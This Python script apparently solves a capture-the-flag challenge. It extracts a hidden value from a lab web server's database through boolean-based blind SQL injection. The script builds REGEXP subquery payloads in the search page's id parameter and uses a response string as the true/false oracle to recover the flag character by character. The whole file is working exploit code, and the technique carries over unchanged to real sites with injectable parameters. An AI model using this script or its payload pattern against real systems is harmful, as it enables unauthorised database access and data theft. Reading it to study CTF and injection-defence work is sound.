#!/usr/bin/env python3
"""Extract Flaaaaag row 3 data via REGEXP prefix matching"""
import urllib.request
import re

BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"
ROW_ID = 3

# Characters to try, in priority order
CHARS = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}[]()_ -.!?@#$%^&*,;:/\\\"'`~+=<>|")

# Regex special chars that need escaping
SPECIAL = set('.^$*+?{}[]()|\\')

def escape_regex(s):
    result = ""
    for c in s:
        if c in SPECIAL:
            result += '\\' + c
        else:
            result += c
    return result

def check_prefix(prefix):
    """Check if fl4gawsl starts with given prefix using regexp"""
    escaped = escape_regex(prefix)
    # Use subquery + regexp
    sq = f"(select(fl4gawsl)from(Flaaaaag)where(id)={ROW_ID})"
    cond = f"{sq}regexp('^{escaped}')"
    url = f"{BASE}?id=2-({cond})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8', errors='ignore')
        return 'NO! Not this!' in resp
    except:
        return False

# Start with known prefix "Ohhh."
prefix = "Ohhh."
print(f"[*] Starting prefix: '{prefix}'")

# Extract remaining characters
max_len = 300  # safety limit
while len(prefix) < max_len:
    found = False
    for c in CHARS:
        test = prefix + c
        if check_prefix(test):
            prefix = test
            print(f"  [{len(prefix)}] '{c}' => {prefix[-40:]}")
            found = True
            break
    if not found:
        print(f"\n[!] No more characters found. Final length: {len(prefix)}")
        break

print(f"\n[+] FLAG DATA: {prefix}")
